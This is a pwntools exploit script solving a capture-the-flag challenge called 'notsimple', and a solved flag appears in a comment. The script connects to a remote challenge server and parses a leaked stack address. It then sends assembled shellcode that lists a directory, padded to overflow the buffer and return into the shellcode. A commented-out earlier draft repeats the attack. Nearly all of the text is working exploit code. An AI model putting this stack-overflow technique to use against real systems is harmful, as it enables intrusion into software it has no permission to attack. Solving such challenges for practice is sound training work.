# from pwn import *
# context(arch='amd64', os='linux')

# BIN = "./notsimple"
# ret = 0x0000000000401016

# shellcode = b''
# shellcode += asm('mov rsp,QWORD PTR fs:[0]')
# shellcode += asm(shellcraft.open('.'))
# shellcode += asm(shellcraft.getdents(3, 'rsp', 0x500))
# shellcode += asm(shellcraft.write(1, 'rsp', 0x500))

# def exploit():

# 	buf = int(io.recv(1024)[19:33],16)
# 	payload = shellcode + b'a'*(0x50 - len(shellcode)) + b'SFP_____'  + p64(buf)
# 	io.recvuntil(">")
# 	io.sendline(payload)
# 	io.interactive()





# rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}

from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

# p = process('./notsimple')
# p = gdb.debug('./notsimple','b *main')
p = remote('193.57.159.27',35316)
print(p.recvuntil('ng! ').decode())
buf_addr = int(p.recvline().decode()[:-1],16)
print(hex(buf_addr))
print(p.recvuntil('> ').decode())


payload = b''
payload += asm('mov rsp,QWORD PTR fs:[0]')
payload += asm(shellcraft.open('.'))
payload += asm(shellcraft.getdents(3, 'rsp', 0x500))
payload += asm(shellcraft.write(1, 'rsp', 0x500))


payload += b'A'*(0x50 - len(payload))
payload += b'SFP_____'
payload += p64(buf_addr)
p.sendline(payload)
p.interactive()